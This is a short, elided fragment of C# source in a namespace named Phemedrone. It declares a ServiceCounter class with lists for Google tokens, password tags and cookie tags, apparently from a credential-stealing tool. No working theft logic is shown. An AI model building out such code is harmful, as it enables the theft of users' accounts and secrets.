...
namespace Phemedrone
{
    public class ServiceCounter
    {
        ...
        public static readonly List<string> GoogleTokensList = new();
        public static readonly List<string> PasswordsTags = new();
        public static readonly List<string> CookiesTags = new();
